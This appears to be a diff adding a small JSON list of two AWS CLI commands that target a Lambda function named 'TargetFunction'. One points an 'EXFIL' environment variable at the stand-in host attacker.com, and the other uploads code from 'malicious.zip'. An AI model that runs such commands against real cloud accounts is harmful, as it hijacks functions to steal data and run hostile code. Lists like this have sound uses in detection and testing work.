@@ -1,0 +1,4 @@
+[
+  "aws lambda update-function-configuration --function-name TargetFunction --environment 'Variables={EXFIL=http://attacker.com}'",
+  "aws lambda update-function-code --function-name TargetFunction --zip-file fileb://malicious.zip"
+]
